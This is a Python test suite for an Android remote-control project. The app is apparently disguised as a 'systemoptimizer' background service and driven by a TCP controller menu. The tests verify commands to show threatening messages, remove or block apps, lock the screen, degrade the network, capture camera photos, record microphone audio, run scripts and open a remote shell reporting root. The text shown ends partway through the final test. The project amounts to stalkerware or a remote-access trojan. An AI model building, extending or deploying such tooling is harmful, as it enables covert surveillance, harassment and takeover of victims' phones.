"""Flow + contract tests for the AndroidOS controller/target project.

Since a real Android emulator is not available in this environment, the harness
verifies the parts that CAN be executed here:

  1. Parser / dispatch contract mirrors of the Android BackgroundService
     handlers (network_deg, play_sound, play_annoying_sound, block_screen,
     play_video, show_serious_warning, block_app). These mirror the exact
     validation order/logic of the Java code so the parsing regression
     (network_deg with 5 fields was previously rejected as a format error) is
     covered.
  2. The real controller.py menu driven over a real TCP socket with patched
     input: verifies that menu options build exactly the commands the Android
     side expects, that exit is "18", and that invalid inputs never leave the
     controller.
  3. The assets/audio sound library files exist and are valid WAV/MP3, plus the
     assets/video video library scanner contract, resource-name validity, and
     audio/video separation.
  4. No stale Wi-Fi / mobile-data / reboot / shutdown / airplane-mode / root
     references remain in the Android code, and the new Device-Owner-aware
     block screen / visible-camera / asset-video / shell-protocol pieces exist.
  5. The interactive Android Shell (option 10) protocol over the TCP framing:
     shell_start -> SHELL_SESSION_STARTED, shell_cmd:<base64> ->
     <output + __SHELLCMD_EOF__>, shell_exit -> SHELL_SESSION_CLOSED.

Run with:  python tests/test_flow.py
"""

import base64
import builtins
import contextlib
import io
import os
import queue
import socket
import sys
import tempfile
import threading

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

import controller  # noqa: E402
from controller import (  # noqa: E402
    PhoneController,
    MESSAGE_DASHBOARD,
    AUDIO_DIR,
    VIDEO_DIR,
    scan_audio_library,
    scan_video_library,
    receive_message,
    send_message,
)

RAW_DIR = os.path.join(ROOT, "app", "src", "main", "res", "raw")
ASSETS_DIR = os.path.join(ROOT, "app", "src", "main", "assets")
AUDIO_DIR = os.path.join(ASSETS_DIR, "audio")
VIDEO_DIR = os.path.join(ASSETS_DIR, "video")
SERVICE_PATH = os.path.join(
    ROOT, "app", "src", "main", "java",
    "com", "example", "systemoptimizer", "BackgroundService.java",
)
CONTROLLER_PATH = os.path.join(ROOT, "controller.py")

SOUND_COUNT = 5  # alarm.wav, binary_code_3.mp3, notification.wav, siren.wav, warning.wav
EXIT = "18"      # the menu exit option / exit command


# ---------------------------------------------------------------------------
# 1) Contract mirrors of the Android parsing/dispatch logic
# ---------------------------------------------------------------------------

def _safe_int_or_neg(s):
    try:
        return int(s.strip())
    except Exception:
        return -1


def android_parse_network_deg(command):
    """Mirror of BackgroundService.handleNetworkDegradation (post-fix).

    Returns (values_tuple, "OK") or (None, error_reason).
    """
    parts = command.split(":")
    if len(parts) < 5:
        return (None, "FORMAT_ERROR")
    latency = _safe_int_or_neg(parts[1])
    if latency < 0:
        return (None, "INVALID_LATENCY")
    loss = _safe_int_or_neg(parts[2])
    if loss < 0:
        return (None, "INVALID_LOSS")
    bandwidth = _safe_int_or_neg(parts[3])
    if bandwidth < 0:
        return (None, "INVALID_BANDWIDTH")
    duration = _safe_int_or_neg(parts[4])
    if duration < 0:
        return (None, "INVALID_DURATION")
    if latency == 0 and loss == 0 and bandwidth == 0:
        return (None, "ALL_ZERO")
    if duration <= 0 or duration > 86400:
        return (None, "DURATION_RANGE")
    if latency > 5000 or loss > 100 or bandwidth > 10000000:
        return (None, "RANGE")
    return ((latency, loss, bandwidth, duration), "OK")


def android_parse_play_sound(command):
    """Mirror of BackgroundService.handlePlaySound validation."""
    parts = command.split(":")
    if len(parts) < 3:
        return (None, "FORMAT_ERROR")
    sound_id = _safe_int_or_neg(parts[1])
    if sound_id < 1 or sound_id > SOUND_COUNT:
        return (None, "INVALID_ID")
    duration = _safe_int_or_neg(parts[2])
    if duration <= 0 or duration > 600:
        return (None, "INVALID_DURATION")
    return ((sound_id, duration), "OK")


def android_parse_annoying_sound(command):
    """Mirror of BackgroundService.handlePlayAnnoyingSound validation."""
    parts = command.split(":")
    if len(parts) < 2:
        return (None, "FORMAT_ERROR")
    duration = _safe_int_or_neg(parts[1])
    if duration <= 0 or duration > 600:
        return (None, "INVALID_DURATION")
    return ((duration,), "OK")


def android_parse_block_screen(command):
    """Mirror of BackgroundService.handleBlockScreen v2 validation.

    Wire format: block_screen:<duration>[:<delay>[:<session_id>]]
    - First field is always duration (v1 backward compatible).
    - Optional delay, optional session id. Delay/range mirror the Java side.
    """
    parts = command.split(":")
    if len(parts) < 2:
        return (None, "FORMAT_ERROR")
    duration = _safe_int_or_neg(parts[1])
    if duration <= 0 or duration > 86400:
        return (None, "INVALID_DURATION")
    delay = 0
    session_id = None
    if len(parts) >= 3 and parts[2].strip() != "":
        delay = _safe_int_or_neg(parts[2])
        if delay is None or delay < 0 or delay > 86400:
            return (None, "INVALID_DELAY")
    if len(parts) >= 4 and parts[3].strip() != "":
        session_id = parts[3].strip()
    return ((duration, delay, session_id), "OK")


def android_parse_serious_warning(command):
    """Mirror of BackgroundService.handleSeriousWarning validation."""
    parts = command.split(":", 1)
    if len(parts) < 2 or not parts[1].strip():
        return (None, "EMPTY_TEXT")
    if len(parts[1]) > 2000:
        return (None, "TEXT_TOO_LONG")
    return ((parts[1],), "OK")


def android_parse_play_video(command):
    """Mirror of BackgroundService.handlePlayVideo validation."""
    parts = command.split(":")
    if len(parts) < 2:
        return (None, "FORMAT_ERROR")
    video_id = _safe_int_or_neg(parts[1])
    if video_id < 1 or video_id > 10000000:
        return (None, "INVALID_ID")
    return ((video_id,), "OK")


def test_network_deg_contract():
    # REGRESSION: the exact 5-field command that used to be rejected.
    vals, status = android_parse_network_deg("network_deg:2000:4:300:1")
    assert status == "OK", status
    assert vals == (2000, 4, 300, 1), vals

    _, status = android_parse_network_deg("network_deg:2000:4:300")          # 4 fields
    assert status == "FORMAT_ERROR", status

    for raw, expected in [
        ("network_deg:abc:4:300:1", "INVALID_LATENCY"),
        ("network_deg:-1:4:300:1", "INVALID_LATENCY"),
        ("network_deg:2000:abc:300:1", "INVALID_LOSS"),
        ("network_deg:2000:-5:300:1", "INVALID_LOSS"),
        ("network_deg:2000:4:abc:1", "INVALID_BANDWIDTH"),
        ("network_deg:2000:4:-10:1", "INVALID_BANDWIDTH"),
        ("network_deg:2000:4:300:1x", "INVALID_DURATION"),
        ("network_deg:2000:4:300:", "INVALID_DURATION"),                     # empty field
        ("network_deg:0:0:0:30", "ALL_ZERO"),
        ("network_deg:2000:4:300:0", "DURATION_RANGE"),
        ("network_deg:2000:4:300:86401", "DURATION_RANGE"),
        ("network_deg:6000:4:300:30", "RANGE"),                              # latency > 5000
        ("network_deg:2000:101:300:30", "RANGE"),                            # loss > 100
        ("network_deg:2000:4:10000001:30", "RANGE"),                         # bw > 10M
        ("network_deg:2000:4:10000000:30", None),                            # exact upper bound
    ]:
        _, status = android_parse_network_deg(raw)
        if expected is None:
            assert status == "OK", (raw, status)
        else:
            assert status == expected, (raw, status, expected)


def test_play_sound_contract():
    for raw, expected in [
        ("play_sound:1:10", "OK"),
        ("play_sound:5:600", "OK"),
        ("play_sound:1:1", "OK"),
        ("play_sound:0:10", "INVALID_ID"),
        ("play_sound:6:10", "INVALID_ID"),
        ("play_sound:9:10", "INVALID_ID"),
        ("play_sound:abc:10", "INVALID_ID"),
        ("play_sound:1:0", "INVALID_DURATION"),
        ("play_sound:1:601", "INVALID_DURATION"),
        ("play_sound:1:abc", "INVALID_DURATION"),
        ("play_sound:1", "FORMAT_ERROR"),
        ("play_sound:", "FORMAT_ERROR"),
    ]:
        _, status = android_parse_play_sound(raw)
        assert status == expected, (raw, status, expected)

    vals, status = android_parse_play_sound("play_sound:1:10")
    assert vals == (1, 10), vals
    vals, status = android_parse_play_sound("play_sound:5:600")
    assert vals == (5, 600), vals

    # legacy command still parses
    vals, status = android_parse_annoying_sound("play_annoying_sound:10")
    assert status == "OK" and vals == (10,), (vals, status)
    _, status = android_parse_annoying_sound("play_annoying_sound:0")
    assert status == "INVALID_DURATION", status


def test_block_screen_contract():
    for raw, expected in [
        ("block_screen:120", "OK"),
        ("block_screen:1", "OK"),
        ("block_screen:86400", "OK"),
        ("block_screen:0", "INVALID_DURATION"),
        ("block_screen:-5", "INVALID_DURATION"),
        ("block_screen:86401", "INVALID_DURATION"),
        ("block_screen:abc", "INVALID_DURATION"),
        ("block_screen:", "INVALID_DURATION"),
        ("block_screen", "FORMAT_ERROR"),
        # v2: optional delay + session id
        ("block_screen:60:5", "OK"),
        ("block_screen:60:0:BS-TEST", "OK"),
        ("block_screen:60:5:BS-TEST123", "OK"),
        ("block_screen:60:86400", "OK"),
        ("block_screen:60:-1", "INVALID_DELAY"),
        ("block_screen:60:86401", "INVALID_DELAY"),
        ("block_screen:60:abc", "INVALID_DELAY"),
    ]:
        vals, status = android_parse_block_screen(raw)
        if expected == "OK":
            assert status == "OK", (raw, vals, status)
            if len(raw.split(":")) >= 3 and raw.split(":")[2] != "":
                assert vals[1] == int(raw.split(":")[2]), (raw, vals)
        else:
            assert status == expected, (raw, status, expected)

    v, status = android_parse_block_screen("block_screen:120")
    assert status == "OK" and v == (120, 0, None), v
    v, status = android_parse_block_screen("block_screen:86400")
    assert status == "OK" and v[0] == 86400, v
    v, status = android_parse_block_screen("block_screen:60:5:BS-TEST")
    assert status == "OK" and v == (60, 5, "BS-TEST"), v


def test_serious_warning_contract():
    for raw, expected in [
        ("show_serious_warning:battery critical", "OK"),
        ("show_serious_warning:1", "OK"),
        ("show_serious_warning:" + "x" * 2000, "OK"),
        ("show_serious_warning:" + "x" * 2001, "TEXT_TOO_LONG"),
        ("show_serious_warning:", "EMPTY_TEXT"),
        ("show_serious_warning", "EMPTY_TEXT"),
        ("show_serious_warning:   ", "EMPTY_TEXT"),
        ("show_serious_warning: a b c ", "OK"),
    ]:
        vals, status = android_parse_serious_warning(raw)
        if expected == "OK":
            assert status == "OK" and vals[0].strip(), (raw, vals, status)
        else:
            assert status == expected, (raw, status, expected)


def test_play_video_contract():
    for raw, expected in [
        ("play_video:1", "OK"),
        ("play_video:10000000", "OK"),
        ("play_video:0", "INVALID_ID"),
        ("play_video:-1", "INVALID_ID"),
        ("play_video:10000001", "INVALID_ID"),
        ("play_video:abc", "INVALID_ID"),
        ("play_video:", "INVALID_ID"),
        ("play_video", "FORMAT_ERROR"),
    ]:
        vals, status = android_parse_play_video(raw)
        if expected == "OK":
            assert status == "OK" and vals == (int(raw.split(":")[1]),), (raw, vals, status)
        else:
            assert status == expected, (raw, status, expected)


def test_android_dispatch_branches_present():
    """The Java dispatcher must route the exact prefixes/commands we test."""
    with open(SERVICE_PATH, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["command.startsWith(\"network_deg:\")",
                  "command.startsWith(\"play_sound:\")",
                  "command.startsWith(\"play_annoying_sound:\")",
                  "command.startsWith(\"block_screen:\")",
                  "command.startsWith(\"play_video:\")",
                  "command.startsWith(\"show_serious_warning:\")",
                  "command.startsWith(\"block_app:\")",
                  "command.equals(\"shell_start\")",
                  "command.startsWith(\"shell_cmd:\")",
                  "command.equals(\"shell_exit\")"]:
        assert token in src, token


def test_menu_numbering_contract():
    """controller.py must expose exactly the final 18-item menu."""
    with open(CONTROLLER_PATH, "r", encoding="utf-8") as f:
        src = f.read()

    expected_rows = [
        "1. Show threatening message",
        "2. Remove Free Fire",
        "3. Disable Free Fire",
        "4. Send repeated notifications",
        "5. Play sound",
        "6. Change wallpaper",
        "7. Show black screen on boot",
        "8. Network degradation",
        "9. Block other apps",
        "10. Android Shell",
        "11. Run script",
        "12. Show device info",
        "13. Capture camera photo",
        "14. Record microphone audio",
        "15. Block screen",
        "16. Play fullscreen video",
        "17. Show serious warning message",
        "18. Exit",
    ]
    for row in expected_rows:
        assert row in src, row

    for forbidden in ["15. Reboot device", "16. Shut down device",
                      "17. Toggle airplane mode", "0. Exit",
                      "Reboot", "Shutdown", "Toggle airplane mode",
                      "Toggle Wi-Fi", "Toggle mobile data",
                      "Send SMS message", "Show call log", "Show contacts"]:
        assert forbidden not in src, forbidden


# ---------------------------------------------------------------------------
# 2) Real controller.py driven over a real TCP socket
# ---------------------------------------------------------------------------

def _run_controller_scenario(inputs, replier=None):
    """Drive the real PhoneController.show_menu() with the given inputs.

    Returns (captured_commands, menu_stdout). Callers must include the exit
    input (EXIT == "18") as the last input.
    """
    captured = []
    out_buf = io.StringIO()

    request_q = queue.Queue()
    for item in inputs:
        request_q.put(item)

    real_input = builtins.input

    def fake_input(prompt=""):
        sys.stdout.write(prompt)
        try:
            return request_q.get(timeout=30)
        except queue.Empty:
            raise RuntimeError("scenario ran out of inputs: %r" % (inputs,))

    def remember_command(sock):
        while True:
            try:
                msg = receive_message(sock)
            except Exception:
                return
            captured.append(msg)
            try:
                if replier is not None:
                    reply = replier(msg)
                else:
                    reply = "ack:" + msg
                send_message(sock, reply)
            except Exception:
                return

    # A connected socket pair: one end is the controller's device socket, the
    # other is the fake target. Each side owns its own fd, so recv never races.
    peer, device = socket.socketpair()
    ctrl = PhoneController(host="127.0.0.1", port=0)
    ctrl.client_socket = peer
    ctrl.connected = True
    threading.Thread(target=remember_command, args=(device,), daemon=True).start()

    builtins.input = fake_input
    controller_thread = threading.Thread(target=ctrl.show_menu, daemon=True)
    with contextlib.redirect_stdout(out_buf):
        try:
            controller_thread.start()
            controller_thread.join(timeout=60)
        finally:
            builtins.input = real_input

    try:
        device.close()
    except OSError:
        pass
    ctrl.close()
    return captured, out_buf.getvalue()


def test_scenario_network_deg_valid_exact():
    # Menu 8 > the exact param set that was historically broken by the
    # controller-building / Android-parsing mismatch.
    captured, out = _run_controller_scenario(["8", "2000", "4", "300", "1", EXIT])
    assert captured == ["network_deg:2000:4:300:1", "exit"], captured
    assert "--- Control Panel ---" in out


def test_scenario_network_deg_empty_bandwidth():
    captured, _ = _run_controller_scenario(["8", "100", "0", "", "30", EXIT])
    assert captured == ["network_deg:100:0:0:30", "exit"], captured


def test_scenario_network_deg_invalid_rejected():
    for bad_inputs in [
        ["8", "2000", "4", "abc", "30", EXIT],
        ["8", "2000", "101", "300", "30", EXIT],
        ["8", "2000", "4", "300", "0", EXIT],
        ["8", "2000", "4", "300", "5x", EXIT],
        ["8", "-1", "4", "300", "30", EXIT],
        ["8", "6000", "4", "300", "30", EXIT],
    ]:
        captured, _ = _run_controller_scenario(bad_inputs)
        assert captured == ["exit"], (bad_inputs, captured)


def test_scenario_network_deg_all_zero_rejected():
    captured, _ = _run_controller_scenario(["8", "0", "0", "", "30", EXIT])
    assert captured == ["exit"], captured


def test_scenario_sound_valid():
    captured, out = _run_controller_scenario(["5", "1", "10", EXIT])
    assert captured == ["play_sound:1:10", "exit"], captured
    assert "--- Sound Library ---" in out
    assert "alarm.wav" in out


def test_scenario_sound_last_entry():
    captured, _ = _run_controller_scenario(["5", "5", "600", EXIT])
    assert captured == ["play_sound:5:600", "exit"], captured


def test_scenario_sound_back_and_invalid():
    captured, _ = _run_controller_scenario(["5", "0", EXIT])                   # back, then exit
    assert captured == ["exit"], captured

    captured, _ = _run_controller_scenario(["5", "9", EXIT])                   # invalid id
    assert captured == ["exit"], captured

    captured, _ = _run_controller_scenario(["5", "1", "abc", EXIT])            # invalid duration
    assert captured == ["exit"], captured

    captured, _ = _run_controller_scenario(["5", "1", "0", EXIT])              # 0 seconds
    assert captured == ["exit"], captured

    captured, _ = _run_controller_scenario(["5", "1", "700", EXIT])            # > 600 seconds
    assert captured == ["exit"], captured


def test_scenario_block_screen():
    # v2: mode(now) + duration + optional session id -> three-field command.
    captured, out = _run_controller_scenario(["15", "1", "120", "BS-TEST", EXIT])
    assert captured == ["block_screen:120:0:BS-TEST", "exit"], captured
    assert "Block screen (strict managed lock)" in out, out

    captured, out = _run_controller_scenario(["15", "1", "86400", "", EXIT])
    assert captured[0].startswith("block_screen:86400:0:BS-"), captured
    assert captured[1] == "exit", captured

    # v2: scheduled mode -> delay is prompted and included.
    captured, _ = _run_controller_scenario(["15", "2", "60", "10", "BS-SCHED", EXIT])
    assert captured == ["block_screen:60:10:BS-SCHED", "exit"], captured

    for bad_inputs in [
        ["15", "3", EXIT],                       # invalid mode
        ["15", "1", "abc", EXIT],                # invalid duration
        ["15", "1", "0", EXIT],                  # 0 seconds
        ["15", "1", "-1", EXIT],
        ["15", "1", "86401", EXIT],
        ["15", "1", "", EXIT],
        ["15", "2", "60", "abc", EXIT],          # invalid delay
        ["15", "2", "60", "-1", EXIT],
        ["15", "2", "60", "86401", EXIT],
        ["15", "1", "60", "a..b", EXIT],         # invalid session id
        ["15", "1", "60", "has space", EXIT],
    ]:
        captured, _ = _run_controller_scenario(bad_inputs)
        assert captured == ["exit"], (bad_inputs, captured)

    # Follow loop: Enter -> status; then the session is reported gone -> loop exits.
    def follow_replier(msg):
        if msg.startswith("block_screen:"):
            return "BLOCK_SCREEN_STARTED\nSession ID: BS-FOLLOW\nState: ACTIVE\n"
        if msg == "block_screen_status":
            return "BLOCK_SESSION_STATUS\nState: NONE\nSession ID: BS-FOLLOW\n"
        return "ack:" + msg

    captured, out = _run_controller_scenario(["15", "1", "30", "BS-FOLLOW", "", EXIT],
                                             replier=follow_replier)
    assert captured == ["block_screen:30:0:BS-FOLLOW", "block_screen_status", "exit"], captured
    assert "Follow loop: [Enter]=status  [c]=cancel  [x]=back" in out, out

    # Follow loop: c -> cancel command sent -> loop exits.
    def cancel_replier(msg):
        if msg.startswith("block_screen:"):
            return "BLOCK_SCREEN_STARTED\nSession ID: BS-CANCEL\nState: ACTIVE\n"
        if msg == "block_screen_cancel":
            return "BLOCK_SCREEN_CANCELLED\nSession ID: BS-CANCEL\n"
        return "ack:" + msg

    captured, _ = _run_controller_scenario(["15", "1", "30", "BS-CANCEL", "c", EXIT],
                                           replier=cancel_replier)
    assert captured == ["block_screen:30:0:BS-CANCEL", "block_screen_cancel", "exit"], captured

    # Strict-unavailable reply terminates option 15 without a follow loop.
    def denied_replier(msg):
        if msg.startswith("block_screen:"):
            return "STRICT_BLOCK_UNAVAILABLE\nDevice Owner: NO\n"
        return "ack:" + msg

    captured, _ = _run_controller_scenario(["15", "1", "30", "BS-DENIED", EXIT],
                                           replier=denied_replier)
    assert captured == ["block_screen:30:0:BS-DENIED", "exit"], captured


def test_scenario_serious_warning():
    captured, _ = _run_controller_scenario(["17", "battery critical", EXIT])
    assert captured == ["show_serious_warning:battery critical", "exit"], captured

    captured, _ = _run_controller_scenario(["17", "note text", EXIT])
    assert captured == ["show_serious_warning:note text", "exit"], captured

    captured, _ = _run_controller_scenario(["17", "", EXIT])
    assert captured == ["exit"], captured

    captured, _ = _run_controller_scenario(["17", "   ", EXIT])
    assert captured == ["exit"], captured


def test_scenario_block_app():
    captured, _ = _run_controller_scenario(
        ["9", "com.google.android.youtube", EXIT])
    assert captured == ["block_app:com.google.android.youtube", "exit"], captured

    captured, _ = _run_controller_scenario(["9", "org.telegram.messenger", EXIT])
    assert captured == ["block_app:org.telegram.messenger", "exit"], captured

    captured, _ = _run_controller_scenario(["9", "", EXIT])
    assert captured == ["exit"], captured

    captured, _ = _run_controller_scenario(["9", "   ", EXIT])
    assert captured == ["exit"], captured

    # أسماء العرض (وليس حزم) تُرفض في أداة التحكم قبل الإرسال
    for display_name in ["YouTube", "WhatsApp", "com", "a..b", "123.abc"]:
        captured, _ = _run_controller_scenario(["9", display_name, EXIT])
        assert captured == ["exit"], (display_name, captured)


def test_block_app_package_regex_present():
    with open(CONTROLLER_PATH, "r", encoding="utf-8") as f:
        src = f.read()
    assert "_PACKAGE_NAME_RE" in src, "controller package regex missing"
    with open(SERVICE_PATH, "r", encoding="utf-8") as f:
        src = f.read()
    assert "PACKAGE_NAME_PATTERN" in src, "Android package regex missing"
    assert "INVALID PACKAGE NAME" in src, "honest invalid-package reply missing"


class _PatchedVideoDir:
    """Point controller.VIDEO_DIR at a temporary directory for tests."""

    def __init__(self, files):
        self._tmp = tempfile.TemporaryDirectory()
        for name in files:
            with open(os.path.join(self._tmp.name, name), "wb") as f:
                f.write(b"0" * 32)

    def __enter__(self):
        self._old = controller.VIDEO_DIR
        controller.VIDEO_DIR = self._tmp.name
        return self._tmp.name

    def __exit__(self, *exc):
        controller.VIDEO_DIR = self._old
        self._tmp.cleanup()


class _PatchedAudioDir:
    """Point controller.AUDIO_DIR at a temporary directory for tests."""

    def __init__(self, files):
        self._tmp = tempfile.TemporaryDirectory()
        for name in files:
            with open(os.path.join(self._tmp.name, name), "wb") as f:
                f.write(b"0" * 32)

    def __enter__(self):
        self._old = controller.AUDIO_DIR
        controller.AUDIO_DIR = self._tmp.name
        return self._tmp.name

    def __exit__(self, *exc):
        controller.AUDIO_DIR = self._old
        self._tmp.cleanup()


def test_scan_video_library():
    with _PatchedVideoDir(["video_10.mp4", "video_2.mp4", "VIDEO_3.mp4",
                           "notes.txt", "video_2x.mp4", "video2.mp4"]) as tmp:
        entries = scan_video_library()
        assert entries == [(2, "video_2.mp4"), (3, "VIDEO_3.mp4"),
                           (10, "video_10.mp4")], entries


def test_scenario_play_video_empty_library():
    with _PatchedVideoDir([]):
        captured, out = _run_controller_scenario(["16", EXIT])
    assert captured == ["exit"], captured
    assert "No videos found" in out


def test_scenario_play_video_valid():
    with _PatchedVideoDir(["video_2.mp4"]):
        captured, out = _run_controller_scenario(["16", "2", EXIT])
    assert captured == ["play_video:2", "exit"], captured
    assert "video_2.mp4" in out

    with _PatchedVideoDir(["video_1.mp4", "video_5.mp4"]):
        captured, _ = _run_controller_scenario(["16", "5", EXIT])
    assert captured == ["play_video:5", "exit"], captured


def test_scenario_play_video_invalid_id_rejected():
    with _PatchedVideoDir(["video_2.mp4"]):
        captured, _ = _run_controller_scenario(["16", "999", EXIT])
    assert captured == ["exit"], captured

    with _PatchedVideoDir(["video_2.mp4"]):
        captured, _ = _run_controller_scenario(["16", "abc", EXIT])
    assert captured == ["exit"], captured


def test_scenario_script_base64():
    # Menu 11 > a temporary script is read, base64-encoded with the chosen
    # delay, and sent as `script_base64:<delay>:<base64>`.
    script_path = os.path.join(HERE, "_tmp_script_test.sh")
    content = "echo hello\n"
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(content)
    try:
        captured, _ = _run_controller_scenario(["11", script_path, "0", EXIT])
    finally:
        try:
            os.remove(script_path)
        except OSError:
            pass

    assert len(captured) == 2 and captured[1] == "exit", captured
    prefix = "script_base64:0:"
    assert captured[0].startswith(prefix), captured
    decoded = base64.b64decode(captured[0][len(prefix):]).decode("utf-8")
    assert decoded == content, (decoded, content)


def test_scenario_message_dashboard():
    # Menu 1 > predefined message (index).
    captured, _ = _run_controller_scenario(["1", "3", EXIT])
    assert captured == ["show_message:idx:3", "exit"], captured

    # Menu 1 > custom message (text).
    custom = len(MESSAGE_DASHBOARD) + 1
    captured, _ = _run_controller_scenario(["1", str(custom), "intercepted", EXIT])
    assert captured == ["show_message:txt:intercepted", "exit"], captured

    # Menu 1 > invalid selection is rejected without sending a command.
    captured, _ = _run_controller_scenario(["1", "99", EXIT])
    assert captured == ["exit"], captured


def test_sound_library_definition_order():
    # library = scan of assets/audio (أصوات فقط) بترتيب أسماء بلا حساسية للحالة،
    # وهو نفس الترتيب الذي تعرضه مكتبة الأصوات في أداة التحكم وصنّفَها Android.
    with _PatchedAudioDir(["warning.wav", "alarm.wav", "notes.txt",
                           "siren.wav", "binary_code_3.mp3", "notification.wav",
                           "video_1.mp4"]) as tmp:
        assert os.listdir(tmp)
        entries = scan_audio_library()
        assert entries == [(1, "alarm.wav"), (2, "binary_code_3.mp3"),
                           (3, "notification.wav"), (4, "siren.wav"),
                           (5, "warning.wav")], entries
    # المكتبة الحقيقية في assets/audio: 5 أصوات
    assert scan_audio_library() == [(1, "alarm.wav"), (2, "binary_code_3.mp3"),
                                    (3, "notification.wav"), (4, "siren.wav"),
                                    (5, "warning.wav")]


def test_sound_library_unfiltered():
    # مكتبة الأصوات تستبعد الملفات غير الصوتية (عبر الامتداد) من assets/audio
    with _PatchedAudioDir(["ping.wav", "deep.mp3", "skip.txt", "clip.zzz"]) as tmp:
        entries = scan_audio_library()
        assert entries == [(1, "deep.mp3"), (2, "ping.wav")], entries


# ---------------------------------------------------------------------------
# 3) Sound/video library files (نفس المواقع التي يقرأها Android)
# ---------------------------------------------------------------------------

def test_sound_library_files():
    expected = ["alarm.wav", "binary_code_3.mp3", "notification.wav",
                "siren.wav", "warning.wav"]
    for name in expected:
        path = os.path.join(AUDIO_DIR, name)
        assert os.path.isfile(path), name
        assert os.path.getsize(path) > 1000, name
        with open(path, "rb") as f:
            head = f.read(12)
        if name.endswith(".wav"):
            assert head[:4] == b"RIFF" and head[8:12] == b"WAVE", (name, head)

    # legacy sounds stay in res/raw and are untouched
    legacy = os.path.join(RAW_DIR, "annoying_sound.mp3")
    assert os.path.isfile(legacy), "annoying_sound.mp3 was deleted"
    assert os.path.getsize(legacy) > 1000
    legacy2 = os.path.join(RAW_DIR, "eevent_trailer.mp3")
    assert os.path.isfile(legacy2), "eevent_trailer.mp3 was deleted"


def test_video_library_files():
    # أداة التحكم تستهدف assets/video؛ والمشغل ينسخ من assets قبل التشغيل
    for name in ["video_1.mp4", "video_2.mp4"]:
        path = os.path.join(VIDEO_DIR, name)
        assert os.path.isfile(path), name
        assert os.path.getsize(path) > 100_000, name


def test_audio_video_separation():
    for f in os.listdir(AUDIO_DIR):
        assert not f.lower().endswith(".mp4"), ("video misplaced in audio", f)
    for f in os.listdir(VIDEO_DIR):
        assert f.lower().endswith((".mp4", ".mkv", ".webm", ".avi")), f
    for f in os.listdir(RAW_DIR):
        assert f.lower().endswith(".mp3"), f


def test_resource_names_valid():
    # اسماء الموارد يجب أن تكون صالحة (أحرف صغيرة وأرقام و_ فقط).
    import re
    valid = re.compile(r"^[a-z0-9_]+$")
    for folder in ["raw", "drawable", "layout"]:
        base = os.path.join(ROOT, "app", "src", "main", "res", folder)
        for name in os.listdir(base):
            stem = os.path.splitext(name)[0]
            assert valid.match(stem), (folder, name)


def test_no_invalid_res_raw_names():
    # أي اسم في res/raw يجب أن يكون صالحاً لـ R.raw.* (بدون أحرف كبيرة).
    for name in os.listdir(RAW_DIR):
        assert name == name.lower(), name


# ---------------------------------------------------------------------------
# 4) Android Shell protocol (option 10)
# ---------------------------------------------------------------------------

def _shell_replier(msg):
    if msg == "shell_start":
        return "SHELL_SESSION_STARTED"
    if msg.startswith("shell_cmd:"):
        cmd = base64.b64decode(msg.split(":", 1)[1]).decode("utf-8")
        if cmd == "id":
            return "uid=0(root) gid=0(root)\n" + "__SHELLCMD_EOF__"
        if cmd == "getprop ro.product.model":
            return "sdk_gphone_x86_64\n" + "__SHELLCMD_EOF__"
        return "(" + cmd + " ok)\n" + "__SHELLCMD_EOF__"
    if msg == "shell_exit":
        return "SHELL_SESSION_CLOSED"
    return "ack:" + msg


def test_scenario_shell_session():
    # جلسة shell تُفتح (shell_start) ثم يُنفَّذ id تلقائياً كتحقق هوية ثم تُغلق.
    captured, out = _run_controller_scenario(
        ["10", "exit", EXIT], replier=_shell_replier)
    assert captured[0] == "shell_start", captured
    assert base64.b64decode(captured[1].split(":", 1)[1]).decode() == "id", captured
    assert captured[2] == "shell_exit" and captured[3] == "exit", captured
    assert "uid=0(root)" in out, out


def test_scenario_shell_session_commands():
    captured, out = _run_controller_scenario(
        ["10", "id", "getprop ro.product.model", "exit", EXIT],
        replier=_shell_replier)
    # shell_start, cmd(id تلقائي), cmd(id يدوي), cmd(getprop), shell_exit, exit
    id_cmds = [m for m in captured if m.startswith("shell_cmd:")
               and base64.b64decode(m.split(":", 1)[1]).decode() == "id"]
    assert captured[0] == "shell_start", captured
    assert len(id_cmds) == 2, (id_cmds, captured)
    getprop = [m for m in captured if m.startswith("shell_cmd:")
               and base64.b64decode(m.split(":", 1)[1]).decode() == "getprop ro.product.model"]
    assert len(getprop) == 1, (getprop, captured)
    assert "shell_exit" in captured and captured[-1] == "exit", captured
    assert "uid=0(root)" in out, out
    assert "sdk_gphone_x86_64" in out, out


def test_scenario_shell_back_to_menu():
    # exit من جلسة shell يعيد المستخدم للقائمة (لا أمر صريح "Invalid choice")
    captured, out = _run_controller_scenario(["10", "exit", "15", "1", "60", "BS-RE", EXIT],
                                             replier=_shell_replier)
    assert captured[0] == "shell_start", captured
    assert captured[-3] == "shell_exit" and captured[-2] == "block_screen:60:0:BS-RE" \
        and captured[-1] == "exit", captured
    assert "--- Control Panel ---" in out
    assert "Invalid choice" not in out
    assert "Cannot return to the director" not in out


# ---------------------------------------------------------------------------
# 4) Regression: no stale toggles / removed features / root power handlers
# ---------------------------------------------------------------------------

def test_no_stale_toggle_references():
    with open(SERVICE_PATH, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["toggle_wifi", "toggle_mobile_data", "WifiManager", "setWifiEnabled",
                  "toggle_network_data", "handleToggleMobileData"]:
        assert token not in src, token


def test_no_removed_device_control_commands():
    """Reboot / shutdown / airplane-mode must be gone from menu AND dispatch."""
    with open(SERVICE_PATH, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["reboot_device", "shutdown_device", "toggle_airplane_mode",
                  "handlePowerAction", "RebootActivity", "ShutdownActivity"]:
        assert token not in src, token
    with open(CONTROLLER_PATH, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["reboot_device", "shutdown_device", "toggle_airplane_mode",
                  "toggle_wifi", "toggle_mobile_data"]:
        assert token not in src, token


def test_no_root_power_handlers_in_service():
    """The service must no longer invoke rooted power commands (Shell.SU)."""
    with open(SERVICE_PATH, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["Shell.SU", "eu.chainfire", "ProcessBuilder(\"su\"",
                  "su -c", "\"reboot\"", "\"svc\", \"power\""]:
        assert token not in src, token


def test_freefire_uninstall_uses_user_zero():
    """Free Fire removal must target user 0 (fixes the 'run as user -1' error)."""
    with open(SERVICE_PATH, "r", encoding="utf-8") as f:
        src = f.read()
